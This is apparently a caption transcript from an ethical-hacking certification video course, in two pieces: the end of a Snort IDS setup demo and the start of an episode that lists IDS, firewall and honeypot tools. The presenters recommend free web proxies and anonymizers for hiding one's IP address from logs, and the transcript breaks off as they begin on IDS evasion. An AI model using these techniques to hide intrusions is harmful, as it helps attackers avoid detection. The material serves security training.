best.\n\n1262\n00:58:08.850 --> 00:58:09.670\nI'm just saying.\n\n1263\n00:58:09.670 --> 00:58:10.520\nI did my best.\n\n1264\n00:58:10.520 --> 00:58:11.503\nShould I say that again?\n\n1265\n00:58:11.503 --> 00:58:12.076\n&gt;&gt; One more time.\n\n1266\n00:58:12.076 --> 00:58:12.741\n&gt;&gt; I did my best.\n\n1267\n00:58:12.741 --> 00:58:14.635\n&gt;&gt; Okay.\n&gt;&gt; Getting no response over there.\n\n1268\n00:58:14.635 --> 00:58:17.060\nHe's purposely look at data and\nlooking away from me.\n\n1269\n00:58:17.060 --> 00:58:19.070\nAll right.\nI've just giving someone a hard time.\n\n1270\n00:58:19.070 --> 00:58:20.830\nSo we're gonna go ahead we go on ahead and\n\n1271\n00:58:20.830 --> 00:58:22.930\nwe actually have configure the file,\nright?\n\n1272\n00:58:22.930 --> 00:58:24.350\nSo now, what are we gonna do?\n\n1273\n00:58:24.350 --> 00:58:27.630\nNow we actually want to run the command\nline with the asking character set\n\n1274\n00:58:27.630 --> 00:58:30.220\nstring on the end to make sure that\nwe can run it, so now we're prepared.\n\n1275\n00:58:30.220 --> 00:58:34.230\nIn other words, snort has actually been\nset up so that we can run it as an IDS.\n\n1276\n00:58:34.230 --> 00:58:36.490\nSo what we're gonna do now is go back in.\n\n1277\n00:58:37.740 --> 00:58:40.680\nWe've got our command already preloaded,\ncuz we did type it in before.\n\n1278\n00:58:40.680 --> 00:58:41.640\nSo we've got it there.\n\n1279\n00:58:41.640 --> 00:58:46.030\nSo instead of the error that\nwe got the last time, booyah,\n\n1280\n00:58:46.030 --> 00:58:46.920\nif that's what they say.\n\n1281\n00:58:46.920 --> 00:58:48.220\nWhat do we get, right?\n\n1282\n00:58:48.220 --> 00:58:51.090\nAnd so, what we get now is\nthe config file is loaded.\n\n1283\n00:58:51.090 --> 00:58:52.540\nIf you look at the very bottom,\n\n1284\n00:58:52.540 --> 00:58:55.350\nthe very last statement there\nis commencing packet processing.\n\n1285\n00:58:55.350 --> 00:58:57.390\nAnd we've actually got snort up and\nrunning.\n\n1286\n00:58:57.390 --> 00:58:59.990\nAnd we've got the rules up and\nrunning with our blacklist.\n\n1287\n00:58:59.990 --> 00:59:03.780\nAnd so now if we were to go in and try to\nhit a website that was on the block list,\n\n1288\n00:59:03.780 --> 00:59:06.080\nit would actually flag it and\nit would capture it for us.\n\n1289\n00:59:06.080 --> 00:59:07.700\nSo, we've got that going.\n\n1290\n00:59:07.700 --> 00:59:13.740\nAnd that in nutshell, is how we have\nto set up and how we configure snot.\n\n1291\n00:59:13.740 --> 00:59:14.350\n&gt;&gt; Very cool.\n\n1292\n00:59:14.350 --> 00:59:14.940\n&gt;&gt; Yeah.\n\n1293\n00:59:14.940 --> 00:59:18.910\nNow something even cooler that we can talk\nabout as well cause you know that was cool\n\n1294\n00:59:18.910 --> 00:59:21.720\nbut I always save a little bit extra for\nyou.\n\n1295\n00:59:21.720 --> 00:59:23.930\n&gt;&gt; You do.\n&gt;&gt; Because I like you guys, and\n\n1296\n00:59:23.930 --> 00:59:25.260\nwe get paid by the demos.\n\n1297\n00:59:25.260 --> 00:59:27.006\nSo obviously it's important\nto have more than one to do.\n\n1298\n00:59:27.006 --> 00:59:29.240\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so let's go,\n\n1299\n00:59:29.240 --> 00:59:30.680\nlet's take a look at another thing.\n\n1300\n00:59:30.680 --> 00:59:32.200\nWe talked a lot about ideas.\n\n1301\n00:59:32.200 --> 00:59:36.214\nSo that, hopefully, you will find to be\nvaluable as a deep dive here with regards\n\n1302\n00:59:36.214 --> 00:59:37.920\nof how to deal with snort.\n\n1303\n00:59:37.920 --> 00:59:39.720\nBut there's another element\nto our discussion here.\n\n1304\n00:59:39.720 --> 00:59:44.150\nYou know, it's IDSs,\nit's firewalls, and it's honeypots.\n\n1305\n00:59:44.150 --> 00:59:48.940\nAnd, regardless of what we do,\nwith honeypots, with IDSs, with firewalls.\n\n1306\n00:59:48.940 --> 00:59:52.230\nOne of the key things, and we've talked\nabout this in some of the other episodes,\n\n1307\n00:59:52.230 --> 00:59:54.390\nwe can anonymize, is ourselves right?\n\n1308\n00:59:54.390 --> 00:59:56.810\nWe kinda hide from everybody out there, or\n\n1309\n00:59:56.810 --> 00:59:59.120\nmake it look as if we're\nnot really who we are.\n\n1310\n00:59:59.120 --> 01:00:02.600\nWe're coming from somebody else or\nrather somewhere else pardon me.\n\n1311\n01:00:02.600 --> 01:00:06.760\nPretend to be somebody else coming from\nsomewhere else, then even if we show up in\n\n1312\n01:00:06.760 --> 01:00:10.350\nthe screen like what we were just showing\nyou, we get tagged with our IP address\n\n1313\n01:00:10.350 --> 01:00:13.550\nWe're not really gonna be who we say we\nare, and so we're gonna stealth ourselves.\n\n1314\n01:00:13.550 --> 01:00:16.600\nSo what I wanted to show you was\nhow we could use a free proxy and\n\n1315\n01:00:16.600 --> 01:00:20.080\nanonymizer out there just to do\na little magic, if you will, right?\n\n1316\n01:00:20.080 --> 01:00:23.150\nSo I thought this would be kinda cool\njust as a way to wrap up this demo and\n\n1317\n01:00:23.150 --> 01:00:25.040\nwrap up this part of the conversation.\n\n1318\n01:00:25.040 --> 01:00:26.820\nSo we can go back to my machine for\njust a minute.\n\n1319\n01:00:26.820 --> 01:00:29.940\nWhat we're gonna do is I'm gonna\njump out of the lab environment and\n\n1320\n01:00:29.940 --> 01:00:32.430\nI'm actually gonna go out\nto the Windows 10 machine\n\n1321\n01:00:32.430 --> 01:00:35.420\nthat we're running just because\nthis way we get to the web and\n\n1322\n01:00:35.420 --> 01:00:38.120\nMike's gonna provide this URL to you guys,\nby the way, after the fact.\n\n1323\n01:00:38.120 --> 01:00:38.720\nIt's a long one.\n\n1324\n01:00:38.720 --> 01:00:41.120\nI don't wanna have to either type it or\nhave you type it all out.\n\n1325\n01:00:41.120 --> 01:00:43.340\nBut there's a little blog\nyou should go out to there.\n\n1326\n01:00:43.340 --> 01:00:44.160\nThere's many of them.\n\n1327\n01:00:44.160 --> 01:00:47.250\nThis one just happens to have a nice\nlist of all the free proxy sites.\n\n1328\n01:00:47.250 --> 01:00:48.370\nSo that's why we go to this one.\n\n1329\n01:00:48.370 --> 01:00:49.500\nBut you'll see here,\n\n1330\n01:00:49.500 --> 01:00:54.260\nthere's over 90+ proxy websites that can\nlet you go in and access these sites.\n\n1331\n01:00:54.260 --> 01:00:58.360\nThis is how people are getting around\nproxies that are blocking access,\n\n1332\n01:00:58.360 --> 01:01:00.900\nthings like that, so\nthere's a whole bunch.\n\n1333\n01:01:00.900 --> 01:01:06.802\nAnonymizer, UltraReach, Surf Shield,\nmy personal favorite Hidemyass.com.\n\n1334\n01:01:06.802 --> 01:01:08.620\n&gt;&gt; [LAUGH]\n&gt;&gt; Which is at the top of the list,\n\n1335\n01:01:08.620 --> 01:01:10.824\nso yeah, so there's a whole bunch right?\n\n1336\n01:01:10.824 --> 01:01:11.650\n&gt;&gt; Uh-huh.\n\n1337\n01:01:11.650 --> 01:01:17.349\n&gt;&gt; So we're gonna load one up,\nI loaded up ProxFree www.https,\n\n1338\n01:01:17.349 --> 01:01:22.736\nwww.prox, P-R-O-X-F-R-E-E, proxfree.com.\n\n1339\n01:01:22.736 --> 01:01:24.421\nThat one you can probably\ntype out quickly.\n\n1340\n01:01:24.421 --> 01:01:27.277\nSo proxfree.com,\nyou could see it up on the screen.\n\n1341\n01:01:27.277 --> 01:01:31.837\nAnd what this allows you to do, the\nanonymous proxy is you can go in, you come\n\n1342\n01:01:31.837 --> 01:01:37.047\ndown here, it allows you to specify your\nserver location to where you wanna be.\n\n1343\n01:01:37.047 --> 01:01:41.917\nI'm right now in Canada, and you know I\ncan then specify an IP address location.\n\n1344\n01:01:41.917 --> 01:01:44.917\nSo, let's be specify where\nI'm gonna come from.\n\n1345\n01:01:44.917 --> 01:01:48.227\nI can allow cookies,\nremove page titles, remove scripts.\n\n1346\n01:01:48.227 --> 01:01:49.960\nSo yeah I can do all sorts of stuff.\n\n1347\n01:01:49.960 --> 01:01:53.160\nAnd then I can type in the address\nthat I wanna go to and\n\n1348\n01:01:53.160 --> 01:01:57.900\nthen it will anonymous me and make it look\nas if am coming from wherever I specified.\n\n1349\n01:01:57.900 --> 01:01:58.560\n&gt;&gt; Very convenient.\n\n1350\n01:01:58.560 --> 01:02:00.430\n&gt;&gt; Yeah,\nvery convenient kind of cool, right.\n\n1351\n01:02:00.430 --> 01:02:01.620\nI run a bunch of these, one or\n\n1352\n01:02:01.620 --> 01:02:05.815\ntwo of them on my local machine\non my laptop, my work machine.\n\n1353\n01:02:05.815 --> 01:02:09.835\nI run these things so that I can obviously\ngo out and do the kind of stuff that I do\n\n1354\n01:02:09.835 --> 01:02:13.775\nand not have to worry about leaving\nbehind bread crumbs, if you will.\n\n1355\n01:02:13.775 --> 01:02:18.140\nSo they're pretty cool, you can get a lot\nof them, either over the web directly, or\n\n1356\n01:02:18.140 --> 01:02:21.340\nyou can find them as actual appliances,\nor not appliances,\n\n1357\n01:02:21.340 --> 01:02:24.770\napplications that you can\ninstall on the local machine.\n\n1358\n01:02:24.770 --> 01:02:26.650\nSo it's just a question of\nhow you wanna approach that.\n\n1359\n01:02:26.650 --> 01:02:29.630\nBut it is kinda cool to know\nthat that stuff's out there.\n\n1360\n01:02:29.630 --> 01:02:30.600\nAll right, how we doing on time?\n\n1361\n01:02:30.600 --> 01:02:32.755\n&gt;&gt; Well, we're doing great.\n\n1362\n01:02:32.755 --> 01:02:34.690\n[LAUGH]\n&gt;&gt; Awesome.\n\n1363\n01:02:34.690 --> 01:02:35.350\n&gt;&gt; We are good.\nSo\n\n1364\n01:02:35.350 --> 01:02:37.860\ndo we have more to go back over,\na little bit?\n\n1365\n01:02:37.860 --> 01:02:39.230\n&gt;&gt; We do have a lot of\nother stuff to discuss.\n\n1366\n01:02:39.230 --> 01:02:42.040\nI'm thinking we may wanna just jump in and\ndo that as another one and\n\n1367\n01:02:42.040 --> 01:02:44.410\ngive the people a little break\nfrom all the stuff we just did.\n\n1368\n01:02:44.410 --> 01:02:48.360\n&gt;&gt; Get a little sip of water, get some\nhydration going on, great demonstrations,\n\n1369\n01:02:48.360 --> 01:02:53.700\nwe got to see how to configure snort,\none of those free IDSs you go out and get.\n\n1370\n01:02:53.700 --> 01:02:55.810\nIt's a great product in and of itself.\n\n1371\n01:02:56.950 --> 01:02:58.996\nIt's free and you really have to\nget in there and work with it.\n\n1372\n01:02:58.996 --> 01:02:59.720\n&gt;&gt; Free!\n\n1373\n01:02:59.720 --> 01:03:01.484\n&gt;&gt; We love the word free around here.\n\n1374\n01:03:01.484 --> 01:03:02.067\n&gt;&gt; Free!\n\n1375\n01:03:02.067 --> 01:03:05.350\n&gt;&gt; But it really shows you, I mean,\nbecause you have to get in there and\n\n1376\n01:03:05.350 --> 01:03:08.590\ntype those rules, it's a good way\nto learn like what's going on.\n\n1377\n01:03:08.590 --> 01:03:12.240\nSo if you end up using one\nof those GUI based IDS's and\n\n1378\n01:03:12.240 --> 01:03:14.650\nyou got to tweak it because it's\nnot doing exactly what you need,\n\n1379\n01:03:14.650 --> 01:03:17.670\nnow you need to know what's going on with\nthose rules in there and you'll find.\n\n1380\n01:03:17.670 --> 01:03:19.020\n&gt;&gt; Did you say UI based or GUI?\n\n1381\n01:03:19.020 --> 01:03:23.450\n&gt;&gt; Gui.\n&gt;&gt; Because we don't like GUI based source.\n\n1382\n01:03:23.450 --> 01:03:25.320\nSo was it UI based?\n\n1383\n01:03:25.320 --> 01:03:27.060\n&gt;&gt; Kind of like BUI based.\n\n1384\n01:03:27.060 --> 01:03:29.560\n&gt;&gt; Absolutely,\nchocolate chips are still soft and melty.\n\n1385\n01:03:31.092 --> 01:03:35.540\n&gt;&gt; And then good on the anonymizers,\nthe free proxies you can get out there.\n\n1386\n01:03:35.540 --> 01:03:36.410\nHide your address.\n\n1387\n01:03:36.410 --> 01:03:39.050\nKind of obfuscate where\nyou're coming from.\n\n1388\n01:03:39.050 --> 01:03:43.070\nMaybe not show up in the log as,\nAdam we're gonna be-\n\n1389\n01:03:43.070 --> 01:03:44.970\n&gt;&gt; Word of the day, obfuscates.\n\n1390\n01:03:44.970 --> 01:03:46.331\n&gt;&gt; Yeah, all right, anyway,\n\n1391\n01:03:46.331 --> 01:03:49.270\nI hope everybody out there\nenjoyed watching this one.\n\n1392\n01:03:49.270 --> 01:03:50.445\nSigning off for IT PRO.TV.\n\n1393\n01:03:50.445 --> 01:03:52.230\nI'm Mike Rodrick.\n\n1394\n01:03:52.230 --> 01:03:53.700\n&gt;&gt; I'm anonymous.\n\n1395\n01:03:53.700 --> 01:03:57.403\n&gt;&gt; [LAUGH] And we'll see you next time.\n\n1396\n01:03:57.403 --> 01:04:04.640\n[MUSIC].\n\n",

00:00:16.787\nI'm your host Mike Rodrick.\n\n4\n00:00:16.787 --> 00:00:20.490\nAnd today we're doing our\nCertified Ethical Hacker Version 9.\n\n5\n00:00:20.490 --> 00:00:21.920\nSpecifically in this episode,\n\n6\n00:00:21.920 --> 00:00:26.860\nwe're actually continuing our conversation\nwith IDS, firewall, and honey pots.\n\n7\n00:00:26.860 --> 00:00:29.430\nWe just got through doing some\ngreat demonstration for you.\n\n8\n00:00:29.430 --> 00:00:32.567\nIf you missed those previous episodes\nmake sure you go back and check them out.\n\n9\n00:00:32.567 --> 00:00:35.723\nWe're gonna round out a little more\ninformation and here to do that for\n\n10\n00:00:35.723 --> 00:00:36.803\nus is Mr. Adam Gordon.\n\n11\n00:00:36.803 --> 00:00:37.800\nHow you doing Adam?\n\n12\n00:00:37.800 --> 00:00:39.490\n&gt;&gt; I'm good, I'm good.\n\n13\n00:00:39.490 --> 00:00:43.540\nI am tuckered out as we\nsay by that demonstration.\n\n14\n00:00:43.540 --> 00:00:44.550\n&gt;&gt; That was a hefty one.\n\n15\n00:00:44.550 --> 00:00:45.570\n&gt;&gt; It was a hefty one.\n\n16\n00:00:45.570 --> 00:00:49.180\nChasing the pig around the pen there\ntrying to get Snort configured can be\n\n17\n00:00:49.180 --> 00:00:50.130\ntime consuming.\n\n18\n00:00:50.130 --> 00:00:53.590\nBut hopefully if you guys have not seen\nit as Mike said go back take a look it is\n\n19\n00:00:53.590 --> 00:00:55.350\nactually some pretty cool stuff.\n\n20\n00:00:55.350 --> 00:00:58.830\nAnd if you do ever decide to deploy\nSnort it'll give you at least the basic\n\n21\n00:00:58.830 --> 00:01:01.830\nconceptual framework,\nbasic ideas of what you can do?\n\n22\n00:01:01.830 --> 00:01:04.150\nLot of additional stuff\nto learn about there.\n\n23\n00:01:04.150 --> 00:01:04.990\nA real great way for\n\n24\n00:01:04.990 --> 00:01:08.405\nyou to jump in and become a little\nbit more familiar with IT Essence.\n\n25\n00:01:08.405 --> 00:01:10.510\n[INAUDIBLE] a lot of others\nideas product out there.\n\n26\n00:01:10.510 --> 00:01:13.896\nWe obviously wanna make sure that you\nhave a little sense and some of those.\n\n27\n00:01:13.896 --> 00:01:15.865\nThere's things like OSSEC.\n\n28\n00:01:15.865 --> 00:01:18.115\nThere's IBM and all the biggies, Cisco.\n\n29\n00:01:18.115 --> 00:01:19.925\nThey all have their own products,\nof course.\n\n30\n00:01:19.925 --> 00:01:22.155\nAnd you can spend lots of money there.\n\n31\n00:01:22.155 --> 00:01:23.965\nSilverSky is another big one.\n\n32\n00:01:23.965 --> 00:01:26.300\nThere's Vanguard Enforcer.\n\n33\n00:01:26.300 --> 00:01:28.420\nAlways had that conversation\nabout the naming.\n\n34\n00:01:28.420 --> 00:01:30.107\nInvention associated with these.\n\n35\n00:01:30.107 --> 00:01:34.708\nFRAG route, that's a good one,\nCheck Point has their own as well,\n\n36\n00:01:34.708 --> 00:01:38.120\nagain all the biggies do,\nMcAfee, all off them.\n\n37\n00:01:38.120 --> 00:01:39.460\nJust thinking about some of that.\n\n38\n00:01:39.460 --> 00:01:41.015\nAlien Vault has one out there.\n\n39\n00:01:41.015 --> 00:01:44.690\nAntrasit they all have different\nIPS ideas kind of system,\n\n40\n00:01:44.690 --> 00:01:47.260\nso there's a whole bunch\nof stuff you can look at.\n\n41\n00:01:47.260 --> 00:01:51.288\nOn the mobile site, there are intrusion\ntools that you can look at as well,\n\n42\n00:01:51.288 --> 00:01:56.910\nWiFi Inspector, WiFi Intruder Detector,\nIntruder Detector Pro.\n\n43\n00:01:56.910 --> 00:02:00.550\nThere's all these different ones\nthat would work on mobile platforms.\n\n44\n00:02:00.550 --> 00:02:01.630\nSo, that's always good and\n\n45\n00:02:01.630 --> 00:02:05.100\ncomforting to know in case somebody is\ntrying to attempt to be able to get in.\n\n46\n00:02:05.100 --> 00:02:09.360\nHack your wireless, excuse me, your\nmobile device, you wanna know about that.\n\n47\n00:02:09.360 --> 00:02:12.372\nFirewalls, you want me talking\nabout firewalls, there's a bunch.\n\n48\n00:02:12.372 --> 00:02:15.623\nThere's a local build in firewalls\nin the most operating systems today.\n\n49\n00:02:15.623 --> 00:02:19.399\nWe can go with those, but there\nare other add-ons, remember Black Ice?\n\n50\n00:02:19.399 --> 00:02:21.429\n&gt;&gt; I do.\n&gt;&gt; And Zone Alarm and all the oldies,\n\n51\n00:02:21.429 --> 00:02:22.350\nyears ago?\n\n52\n00:02:22.350 --> 00:02:25.840\n&gt;&gt; A lot of those,\nsome may still be around, some may not.\n\n53\n00:02:25.840 --> 00:02:29.730\nComodo Firewall is one that's\ncommon a lot of people use.\n\n54\n00:02:29.730 --> 00:02:31.400\nCisco has their own, obviously.\n\n55\n00:02:31.400 --> 00:02:33.090\nWe know all about them.\n\n56\n00:02:33.090 --> 00:02:36.690\nUntangle NG Firewall,\nCheck Point has their own stuff.\n\n57\n00:02:36.690 --> 00:02:37.550\nSonic Wall.\n\n58\n00:02:37.550 --> 00:02:42.394\nRight, all the biggies eScan,\nFortiGate Online Armor.\n\n59\n00:02:42.394 --> 00:02:45.180\nThere's a whole bunch of them you\ncan find them all over the place.\n\n60\n00:02:45.180 --> 00:02:47.650\nProbably not too difficult to\nfind some kind of that stuff.\n\n61\n00:02:47.650 --> 00:02:51.920\nThere are mobile based firewalls most of\nthe mobile vendors have them Blackberry I\n\n62\n00:02:51.920 --> 00:02:53.250\nhave one running on my Blackberry.\n\n63\n00:02:53.250 --> 00:02:56.550\nWe all have them built-in, but\nthere's the Android firewall.\n\n64\n00:02:56.550 --> 00:03:01.290\nThere's firewall IP on mobile platforms,\nthose kind of thought processes.\n\n65\n00:03:01.290 --> 00:03:03.510\nDroid firewall, a firewall.\n\n66\n00:03:03.510 --> 00:03:06.725\nLiterally, the small letter [LAUGH] a,\na firewall.\n\n67\n00:03:06.725 --> 00:03:11.020\nAFWall+ which is on GitHub,\nyou could that their droid wall\n\n68\n00:03:11.020 --> 00:03:13.080\nis all sorts of different\nonce you'll find out there.\n\n69\n00:03:13.080 --> 00:03:15.410\nAnd don't overlook and get by the way.\n\n70\n00:03:15.410 --> 00:03:19.030\nNot for firewalls, cause it's not\nwhat gets about but generically just\n\n71\n00:03:19.030 --> 00:03:22.140\ngoing out on GitHub, looking for\na lot of this kind of software.\n\n72\n00:03:22.140 --> 00:03:23.180\nA lot of this stuff,\n\n73\n00:03:23.180 --> 00:03:27.070\nin general it's security related stuff,\nwinds up out there in various places.\n\n74\n00:03:27.070 --> 00:03:30.310\nCNET, Tucows, whatever it may be but\na lot of it's on Git as well.\n\n75\n00:03:30.310 --> 00:03:30.840\n&gt;&gt; Yes.\n&gt;&gt; And so\n\n76\n00:03:30.840 --> 00:03:32.480\nthat's just something to consider.\n\n77\n00:03:32.480 --> 00:03:33.670\nMicrosoft, total random aside,\n\n78\n00:03:33.670 --> 00:03:37.470\nbecause if we don't do at least one\nper episode it just wouldn't be me.\n\n79\n00:03:37.470 --> 00:03:38.290\n&gt;&gt; Doesn't feel right.\n\n80\n00:03:38.290 --> 00:03:38.831\n&gt;&gt; It wouldn't right.\n\n81\n00:03:38.831 --> 00:03:41.123\nAnd so, total random aside cuz you and\n\n82\n00:03:41.123 --> 00:03:45.416\nI share a commonality in the sense that\nwe do not just this kind of work and\n\n83\n00:03:45.416 --> 00:03:49.374\nthis kind of training but\nwe do a lot of work on the Microsoft site.\n\n84\n00:03:49.374 --> 00:03:52.680\nMm-hm.\nAnd so, they have started to post for all\n\n85\n00:03:52.680 --> 00:03:56.460\nof the Azure classes because of all the\nconstant churning in that environment and\n\n86\n00:03:56.460 --> 00:04:00.680\nthe issues with the Azure related passes\ngetting into separate demo environments?\n\n87\n00:04:00.680 --> 00:04:02.778\nAll that stuff's being\nposted out to Git now.\n\n88\n00:04:02.778 --> 00:04:05.530\nSo, they're getting all that stuff\nto try to keep up to date with it,\n\n89\n00:04:05.530 --> 00:04:08.320\nwhich is still not working the best,\nbut it's better than it was.\n\n90\n00:04:08.320 --> 00:04:10.187\n&gt;&gt; For sure.\n&gt;&gt; Yeah, they're putting it all out there,\n\n91\n00:04:10.187 --> 00:04:12.918\nso it's kinda intriguing, cuz that's\nlike you would never have thought in all\n\n92\n00:04:12.918 --> 00:04:15.040\nthe years of Microsoft\n&gt;&gt; Yeah, but doing this kinda stuff,\n\n93\n00:04:15.040 --> 00:04:17.160\nyou would ever see them\nputting their stuff out there.\n\n94\n00:04:17.160 --> 00:04:19.700\nBut since they started playing nice\na few years ago with Linux and\n\n95\n00:04:19.700 --> 00:04:22.320\nthey're becoming a lot more friendly\nin those areas, they've gone to Git.\n\n96\n00:04:22.320 --> 00:04:25.048\nAnd they're actually putting all their\nstuff up on Git for us as trainers for\n\n97\n00:04:25.048 --> 00:04:25.696\nthe Azure stuff.\n\n98\n00:04:25.696 --> 00:04:26.658\n&gt;&gt; And I like GitHub versus,\n\n99\n00:04:26.658 --> 00:04:28.901\nnothing wrong with the other\nsites like CNET and [CROSSTALK].\n\n100\n00:04:28.901 --> 00:04:31.838\n&gt;&gt; Yeah, don't wanna diss them\nby any means, they're all good.\n\n101\n00:04:31.838 --> 00:04:33.733\n&gt;&gt; They have to pay.\n\n102\n00:04:33.733 --> 00:04:34.953\nThey have to make revenue somehow.\n\n103\n00:04:34.953 --> 00:04:37.170\n&gt;&gt; They do.\n&gt;&gt; There's a lot of ads and\n\n104\n00:04:37.170 --> 00:04:38.810\nthings like that,\nthat I see on some of those.\n\n105\n00:04:38.810 --> 00:04:41.330\nAnd not that I have\nanything wrong with that.\n\n106\n00:04:41.330 --> 00:04:45.140\nWhat I don't care for is when they try to\nmake an ad look like the button that you\n\n107\n00:04:45.140 --> 00:04:48.100\nshould use to download what\nyou were searching for.\n\n108\n00:04:48.100 --> 00:04:51.830\nTo trick you into clicking on\nsomething that you really didn't want.\n\n109\n00:04:51.830 --> 00:04:54.510\nTake you to some ad, and\nthey get a click-per, whatever.\n\n110\n00:04:54.510 --> 00:04:58.120\nThat's what I really like about GitHub is,\nmaybe a little more difficult to find or\n\n111\n00:04:58.120 --> 00:05:02.080\nnavigate around because it's\npretty texty and things like that.\n\n112\n00:05:02.080 --> 00:05:05.150\nBut no ads, not very many ads,\nI should say.\n\n113\n00:05:05.150 --> 00:05:07.130\nJust my-\n&gt;&gt; Virtue, no, no, virtue.\n\n114\n00:05:07.130 --> 00:05:09.643\nOne of my very good friend,\nactually, is a trainer for them.\n\n115\n00:05:09.643 --> 00:05:10.696\n&gt;&gt; For Git?\n\n116\n00:05:10.696 --> 00:05:11.279\n&gt;&gt; [CROSSTALK] for Git, yeah.\n\n117\n00:05:11.279 --> 00:05:13.250\n&gt;&gt; Nice.\n&gt;&gt; Recently he started various role.\n\n118\n00:05:13.250 --> 00:05:16.040\nReally excited about it,\nreally good stuff.\n\n119\n00:05:16.040 --> 00:05:17.440\nAnd they're growing like gangbusters, too.\n\n120\n00:05:17.440 --> 00:05:18.030\n&gt;&gt; Wow.\n\n121\n00:05:18.030 --> 00:05:19.080\n&gt;&gt; Huge, huge.\n\n122\n00:05:19.080 --> 00:05:20.800\nSo, yeah, so really excited.\n\n123\n00:05:20.800 --> 00:05:22.170\nSo, just think about that.\n\n124\n00:05:22.170 --> 00:05:25.610\nJust total random aside.\n\n125\n00:05:25.610 --> 00:05:27.580\nWe wanna think about honey pots and\nhoneypot tools.\n\n126\n00:05:27.580 --> 00:05:28.790\nSince we're talking about tools.\n\n127\n00:05:28.790 --> 00:05:30.630\nYeah, you can go out and\nfind all sorts of stuff.\n\n128\n00:05:30.630 --> 00:05:33.190\nLa Brea Tar Pit is a pretty classic one.\n\n129\n00:05:33.190 --> 00:05:37.910\nThere's WinHoneyd, Win,\nW-I-N honey small D.\n\n130\n00:05:37.910 --> 00:05:41.000\nPatriot Box, there's Glastopf.\n\n131\n00:05:42.450 --> 00:05:44.255\nI never know how to [LAUGH] pronounce.\n\n132\n00:05:44.255 --> 00:05:48.175\nSo, but it's a G-L-A-S-T-O-P-F.\n\n133\n00:05:48.175 --> 00:05:51.627\nThere's Argos,\nthere's all sorts of ones out there.\n\n134\n00:05:51.627 --> 00:05:53.568\nHoneyBOTs another big\none that's out there.\n\n135\n00:05:53.568 --> 00:05:55.753\nBut I know we put up honeynet.org earlier,\nso\n\n136\n00:05:55.753 --> 00:05:57.960\nyou can find a lot of\nthis stuff out there.\n\n137\n00:05:57.960 --> 00:06:00.251\nWe do have HoneyBOT tools\non the mobile site as well.\n\n138\n00:06:00.251 --> 00:06:04.154\nHostage I guess is how you pronounce it.\n\n139\n00:06:04.154 --> 00:06:08.664\nH-O-S-T-A-G-E is an a generic honeypot\non mobile devices you can actually run.\n\n140\n00:06:08.664 --> 00:06:11.620\nWhich is kind of cool because we put\nit out there on the mobile side.\n\n141\n00:06:11.620 --> 00:06:14.270\nSo, that always makes it exciting\nat a dinner party when you\n\n142\n00:06:14.270 --> 00:06:18.080\ncan pull out your phone and say hey, by\nthe way let's play spin the honeypot and\n\n143\n00:06:18.080 --> 00:06:20.700\nfind out what happens there.\n\n144\n00:06:20.700 --> 00:06:22.493\nSo, that's always exciting.\n\n145\n00:06:22.493 --> 00:06:25.946\nDo that during happy hour at the bar and\nwow you've got yourself a party.\n\n146\n00:06:25.946 --> 00:06:28.260\n&gt;&gt; [INAUDIBLE]\n&gt;&gt; No, never.\n\n147\n00:06:28.260 --> 00:06:28.930\nNot me.\n\n148\n00:06:28.930 --> 00:06:31.260\nI just sit around watch\neverybody get stupid.\n\n149\n00:06:31.260 --> 00:06:35.488\nIt's one of the things I learned as I got\nolder, because I did have, as most of us\n\n150\n00:06:35.488 --> 00:06:39.546\ndo those moments in my life early on where\nI did feel I had something to prove.\n\n151\n00:06:39.546 --> 00:06:40.882\n&gt;&gt; Yes.\n&gt;&gt; I was the stupid, yes.\n\n152\n00:06:40.882 --> 00:06:41.700\n&gt;&gt; Yeah, exactly.\n\n153\n00:06:41.700 --> 00:06:43.950\n[LAUGH]\n&gt;&gt; That is the slogan, I was the stupid.\n\n154\n00:06:43.950 --> 00:06:46.240\nFeel the stupid, is actually the slogan.\n\n155\n00:06:46.240 --> 00:06:50.890\nBut I thought I had something to prove,\nas we all do at some point in time.\n\n156\n00:06:50.890 --> 00:06:53.310\nBut then as I got older,\nI don't know about being wiser, but\n\n157\n00:06:53.310 --> 00:06:56.340\nas I got older I realized that the only\nthing I had to prove was that I\n\n158\n00:06:56.340 --> 00:06:59.290\ndidn't need to be stupid in order to\nprove that I had something to prove.\n\n159\n00:06:59.290 --> 00:07:02.380\nSo, I realized that, I could sit back and\nwatch other people prove\n\n160\n00:07:02.380 --> 00:07:05.220\nhow stupid they are, and that would\nbe fun and exciting in and of itself.\n\n161\n00:07:05.220 --> 00:07:06.420\nSo, it's kinda cool.\n\n162\n00:07:06.420 --> 00:07:10.750\nSo, all right,\nalways trying to give you new tools and\n\n163\n00:07:10.750 --> 00:07:12.828\nlinks that you can find for\nstuff out there.\n\n164\n00:07:12.828 --> 00:07:15.968\nSo, you have some of those prove to be of\ninterest to you then great that's even\n\n165\n00:07:15.968 --> 00:07:18.873\nbetter cuz obviously you have the more\ntools you know about the better off\n\n166\n00:07:18.873 --> 00:07:19.843\nultimately you can be.\n\n167\n00:07:19.843 --> 00:07:23.271\nAnd plus these days if you wanna set up\na virtual environment play with some of\n\n168\n00:07:23.271 --> 00:07:26.968\nthese it gives you a lot of options to\ninstall, configure, play around with, and\n\n169\n00:07:26.968 --> 00:07:30.040\nthen come back and obviously try\nto see what does and doesn't work.\n\n170\n00:07:30.040 --> 00:07:31.970\nSo go, yeah, monkey.org.\n\n171\n00:07:31.970 --> 00:07:32.479\nThat's always a good one.\n\n172\n00:07:32.479 --> 00:07:33.535\n&gt;&gt; Yeah [LAUGH].\n&gt;&gt; We like them.\n\n173\n00:07:33.535 --> 00:07:37.090\n[SOUND] They're good,\nthey're a lot of fun.\n\n174\n00:07:37.090 --> 00:07:40.370\nAll right, so [INAUDIBLE], let's talk\nabout some different kinds of attacks.\n\n175\n00:07:40.370 --> 00:07:42.542\nWe've been talking about tools and\ndifferent things, and\n\n176\n00:07:42.542 --> 00:07:44.330\nthere are different ways\nwe can launch attacks.\n\n177\n00:07:44.330 --> 00:07:47.309\nWe've talked about a lot of them\nin some of the other episodes.\n\n178\n00:07:47.309 --> 00:07:50.890\nThere are insertion attacks,\nthere's invasion techniques we can use.\n\n179\n00:07:50.890 --> 00:07:51.728\nThere's all sorts of things.\n\n180\n00:07:51.728 --> 00:07:53.429\nSo, if we're trying to evade,\n\n181\n00:07:53.429 --> 00:07:57.273\nwe're trying to ultimately decide\nhow to push traffic through the IDS.\n\n182\n00:07:57.273 --> 00:08:01.134\nThese are all, remember Gonna be\nthings we will do against an IDS and\n\n183\n00:08:01.134 --> 00:08:05.350\ntry to figure out how we can broach or\nbreach the ideas and get back 